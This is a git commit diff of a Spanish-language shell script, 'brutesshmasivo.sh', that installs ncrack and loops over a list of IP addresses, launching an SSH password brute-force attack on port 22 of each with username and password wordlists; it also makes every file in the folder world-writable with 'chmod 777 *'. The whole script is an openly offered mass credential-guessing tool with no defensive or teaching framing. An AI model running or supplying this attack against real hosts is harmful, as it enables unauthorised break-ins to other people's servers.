e227acd90fcdd249c079be88ef1eafd2936098cf
hackingyseguridad <antonio_taboada@hotmail.es>
2021-12-02 17:08:50 +0100

    Update brutesshmasivo.sh

--- brutesshmasivo.sh
+++ brutesshmasivo.sh
@@ -1,7 +1,12 @@
+#!/bin/sh
+apt-get install ncrack
+echo
+echo "##################################################################"
 echo "ssh masivo a IPs en fichero ip.txt"
 chmod 777 *
 echo "Para mantener como proceso ejecutar: nohup ./brutesshmasivo.sh &"
 echo "Uso.: ./brutesshmasivo.sh "
+echo "##################################################################"
 for n in `cat ip.txt`
-do sh brutessh4.sh $n
+do echo $n "<=== IP "; ncrack $n -p 22 -U usuarios.txt -P claves.txt
 done
